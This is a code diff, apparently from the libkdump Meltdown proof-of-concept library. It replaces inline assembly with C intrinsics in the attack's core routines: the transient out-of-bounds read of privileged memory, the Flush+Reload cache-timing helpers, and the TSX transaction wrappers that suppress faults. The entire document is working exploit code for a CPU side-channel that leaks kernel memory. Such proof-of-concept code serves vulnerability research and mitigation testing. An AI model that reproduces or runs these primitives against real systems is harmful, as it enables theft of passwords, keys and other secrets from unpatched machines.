@@ -10,6 +10,7 @@
 #include <stdarg.h>
 #include <stdlib.h>
 #include <unistd.h>
+#include <x86intrin.h>
 
 libkdump_config_t libkdump_auto_config = {0};
 
@@ -32,92 +33,45 @@ static libkdump_config_t config;
 #error NO_TSX and FORCE_TSX cannot be used together!
 #endif
 
-#ifndef NO_TSX
-#define _XBEGIN_STARTED (~0u)
-#endif
-
 #if defined(__i386__) && defined(FORCE_TSX)
 #undef FORCE_TSX
 #warning TSX cannot be forced on __i386__ platform, proceeding with compilation without it
 #endif
 
-#ifdef __x86_64__
+static __attribute__((always_inline)) void meltdown_nonull(void) {
+  uint64_t byte;
 
-// ---------------------------------------------------------------------------
-#define meltdown                                                               \
-  asm volatile("xorq %%rax, %%rax\n"                                           \
-               "1:\n"                                                          \
-               "movq (%%rsi), %%rsi\n"                                         \
-               "movb (%%rcx), %%al\n"                                          \
-               "shl $12, %%rax\n"                                              \
-               "jz 1b\n"                                                       \
-               "movq (%%rbx,%%rax,1), %%rbx\n"                                 \
-               :                                                               \
-               : "c"(phys), "b"(mem), "S"(0)                                   \
-               : "rax");
+retry:
+  byte = *(volatile uint8_t*)phys;
+  byte <<= 12;
+  if (byte == 0) goto retry;
 
-// ---------------------------------------------------------------------------
-#define meltdown_nonull                                                        \
-  asm volatile("xorq %%rax, %%rax\n"                                           \
-               "1:\n"                                                          \
-               "movb (%%rcx), %%al\n"                                          \
-               "shl $12, %%rax\n"                                              \
-               "jz 1b\n"                                                       \
-               "movq (%%rbx,%%rax,1), %%rbx\n"                                 \
-               :                                                               \
-               : "c"(phys), "b"(mem)                                           \
-               : "rax");
+  *(volatile uint64_t*)(mem + byte);
+}
 
-// ---------------------------------------------------------------------------
-#define meltdown_fast                                                          \
-  asm volatile("xorq %%rax, %%rax\n"                                           \
-               "movb (%%rcx), %%al\n"                                          \
-               "shl $12, %%rax\n"                                              \
-               "movq (%%rbx,%%rax,1), %%rbx\n"                                 \
-               :                                                               \
-               : "c"(phys), "b"(mem)                                           \
-               : "rax");
+static __attribute__((always_inline)) void meltdown_fast(void) {
+  uint64_t byte;
 
-#else /* __i386__ */
+  byte = *(volatile uint8_t*)phys;
+  byte <<= 12;
+  *(volatile uint64_t*)(mem + byte);
+}
 
-// ---------------------------------------------------------------------------
-#define meltdown                                                               \
- asm volatile("xorl %%eax, %%eax\n"                                            \
-              "1:\n"                                                           \
-              "movl (%%esi), %%esi\n"                                          \
-              "movb (%%ecx), %%al\n"                                           \
-              "shl $12, %%eax\n"                                               \
-              "jz 1b\n"                                                        \
-              "movl (%%ebx,%%eax,1), %%ebx\n"                                  \
-              :                                                                \
-              : "c"(phys), "b"(mem), "S"(0)                                    \
-              : "eax");
+static __attribute__((always_inline)) void meltdown(void) {
+  uint64_t byte;
 
-// ---------------------------------------------------------------------------
-#define meltdown_nonull                                                        \
-  asm volatile("xorl %%eax, %%eax\n"                                           \
-               "1:\n"                                                          \
-               "movb (%%ecx), %%al\n"                                          \
-               "shl $12, %%rax\n"                                              \
-               "jz 1b\n"                                                       \
-               "movl (%%ebx,%%eax,1), %%ebx\n"                                 \
-               :                                                               \
-               : "c"(phys), "b"(mem)                                           \
-               : "eax");
+retry:
+  *(volatile uint64_t*)0;
 
-// ---------------------------------------------------------------------------
-#define meltdown_fast                                                          \
-  asm volatile("xorl %%eax, %%eax\n"                                           \
-               "movb (%%ecx), %%al\n"                                          \
-               "shl $12, %%rax\n"                                              \
-               "movl (%%rbx,%%rax,1), %%rbx\n"                                 \
-               :                                                               \
-               : "c"(phys), "b"(mem)                                           \
-               : "eax");
-#endif
+  byte = *(volatile uint8_t*)phys;
+  byte <<= 12;
+  if (byte == 0) goto retry;
+
+  *(volatile uint64_t*)(mem + byte);
+}
 
 #ifndef MELTDOWN
-#define MELTDOWN meltdown_nonull
+#define MELTDOWN meltdown_nonull()
 #endif
 
 // ---------------------------------------------------------------------------
@@ -149,43 +103,28 @@ static void debug(d_sym_t symbol, const char *fmt, ...) {
 
 // ---------------------------------------------------------------------------
 static inline uint64_t rdtsc() {
-  uint64_t a = 0, d = 0;
-  asm volatile("mfence");
-#if defined(USE_RDTSCP) && defined(__x86_64__)
-  asm volatile("rdtscp" : "=a"(a), "=d"(d) :: "rcx");
-#elif defined(USE_RDTSCP) && defined(__i386__)
-  asm volatile("rdtscp" : "=A"(a), :: "ecx");
-#elif defined(__x86_64__)
-  asm volatile("rdtsc" : "=a"(a), "=d"(d));
-#elif defined(__i386__)
-  asm volatile("rdtsc" : "=A"(a));
+  uint64_t a;
+  uint32_t c;
+
+#if defined(USE_RDTSCP)
+  a = __rdtscp(&c);
+#else
+  _mm_mfence();
+  a = __rdtsc();
+  _mm_mfence();
 #endif
-  a = (d << 32) | a;
-  asm volatile("mfence");
   return a;
 }
 
-#if defined(__x86_64__)
 // ---------------------------------------------------------------------------
-static inline void maccess(void *p) {
-  asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax");
+static __attribute__((always_inline)) void maccess(void *p) {
+  *(volatile size_t*)p;
 }
 
 // ---------------------------------------------------------------------------
-static void flush(void *p) {
-  asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax");
+static __attribute__((always_inline)) void flush(void *p) {
+  _mm_clflush(p);
 }
-#else
-// ---------------------------------------------------------------------------
-static inline void maccess(void *p) {
-  asm volatile("movl (%0), %%eax\n" : : "c"(p) : "eax");
-}
-
-// ---------------------------------------------------------------------------
-static void flush(void *p) {
-  asm volatile("clflush 0(%0)\n" : : "c"(p) : "eax");
-}
-#endif
 
 // ---------------------------------------------------------------------------
 static int __attribute__((always_inline)) flush_reload(void *ptr) {
@@ -206,7 +145,7 @@ static int __attribute__((always_inline)) flush_reload(void *ptr) {
 // ---------------------------------------------------------------------------
 static void *nopthread(void *dummy) {
   while (1) {
-    asm volatile("nop");
+    _mm_pause();
   }
 }
 
@@ -227,16 +166,12 @@ static void *yieldthread(void *dummy) {
 #ifndef NO_TSX
 // ---------------------------------------------------------------------------
 static __attribute__((always_inline)) inline unsigned int xbegin(void) {
-  unsigned status;
-  //asm volatile("xbegin 1f \n 1:" : "=a"(status) : "a"(-1UL) : "memory");
-  asm volatile(".byte 0xc7,0xf8,0x00,0x00,0x00,0x00" : "=a"(status) : "a"(-1UL) : "memory");
-  return status;
+  return _xbegin();
 }
 
 // ---------------------------------------------------------------------------
 static __attribute__((always_inline)) inline void xend(void) {
-  //asm volatile("xend" ::: "memory");
-  asm volatile(".byte 0x0f; .byte 0x01; .byte 0xd5" ::: "memory");
+  _xend();
 }
 #endif
 
